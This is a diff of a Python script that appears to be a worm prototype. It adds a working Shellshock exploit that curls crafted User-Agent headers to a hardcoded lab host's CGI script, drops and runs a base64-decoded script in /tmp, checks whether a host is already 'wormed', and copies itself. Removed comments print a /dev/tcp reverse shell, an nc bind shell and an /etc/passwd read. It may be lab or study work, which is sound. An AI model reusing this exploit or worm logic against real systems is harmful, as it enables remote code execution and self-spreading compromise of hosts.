@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 
-import os, sys # TODO: use subprocess instead of os (?)
+import os, sys, subprocess # TODO: use subprocess instead of os (?)
+import base64
 from datetime import datetime
 
 # Test payload information
@@ -36,32 +37,39 @@ def execute_payload():
 # Rudimentary way to make a LOCAL copy of itself when executed
 def local_replicate():
 	script = sys.argv
-	name = script[0] # type: string
+	name = script[0]
 
 	os.mkdir('test')
 	os.system('cp ' + name + ' test')
 
 # Prototype for shellshock exploit via python
 def exploit():
-	"""
-	# Shellshock Exploit References
+	targets = {'192.168.56.111': '/cgi-bin/shock.sh'} # Hardcoding this for now
 
-	https://github.com/binexisHATT/Exploits/blob/master/shellshock.py
-	curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://10.10.10.56/cgi-bin/user.sh                                                                
-		exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
-		exploit += '\'' + cmd + '\'"'
-		exploit += ' ' + url
-		subprocess.run(exploit, shell=True)
+	# Test if host has already been wormed: if yes, create test_already_wormed folder and exits
+	if os.path.exists('/tmp/test.sh'):
+		print('Machine has already been wormed!')
+		os.mkdir('test_already_wormed')
+		sys.exit(0)
 
-	https://www.exploit-db.com/exploits/34900
-		headers = {"Cookie": payload, "Referer": payload}
-		payload = "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/"+lhost+"/"+str(lport)+" 0>&1 &"
-		payload = "() { :;}; /bin/bash -c 'nc -l -p "+rport+" -e /bin/bash &'"
-	"""
+	# Hardcoding this for now
+	cmd_list = []
+	cmd_list.append('echo ZWNobyAnc3VjY2Vzc2Z1bCcgPiAvdG1wL3Rlc3Rfc3VjY2Vzcy50eHQ= > /tmp/test') # echo 'successful' > /tmp/test_success.txt
+	cmd_list.append('base64 -d /tmp/test > /tmp/test.sh')
+	cmd_list.append('chmod 777 /tmp/test.sh')
+	cmd_list.append('/tmp/test.sh') # Successful when test_success.txt file gets created, proving creation and execution of a file on remote host
+	print(cmd_list) # Debug
 
-	targetIPs = ['127.0.0.1'] # Hardcoding this for now
-	vulnerable_path = ['/cgi-bin/admin.cgi'] # Hardcoding this for now
-	# TODO: make it work
+	for IP in targets:
+		vulnerable_path = targets[IP]
+		url = f'http://{IP}{vulnerable_path}'
+		print(url) # Debug
+
+		for cmd in cmd_list:
+			exploit = 'curl -H \"user-agent: () { :; }; echo; echo; /bin/bash -c '
+			exploit += '\'' + cmd + '\'"'
+			exploit += ' ' + url
+			subprocess.run(exploit, shell=True)
 
 def main():
 	# TODO:
@@ -79,7 +87,7 @@ def main():
 	copy_payload()
 	execute_payload()
 	local_replicate() # This will not be necessary
-	
+
 
 	"""
 	Making a copy of itself on vulnerable host:
